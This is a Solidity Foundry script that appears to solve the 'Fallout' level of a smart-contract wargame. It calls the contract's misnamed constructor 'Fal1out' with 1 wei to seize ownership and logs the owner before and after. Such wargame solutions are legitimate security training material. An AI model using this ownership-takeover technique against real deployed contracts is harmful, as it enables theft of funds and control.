// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../levels/level02.sol";
import "forge-std/console.sol";

contract MyScript is Script {
   
    Fallout public fallOutInstance = Fallout(0xB4D1246E2FaD78ac5d41eDE81aC1A00f4EaBf473);
    
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        console.log(fallOutInstance.owner());      
        fallOutInstance.Fal1out{value: 1 wei}();
        console.log("New Owner is");
        console.log(fallOutInstance.owner());

        vm.stopBroadcast();
    }
}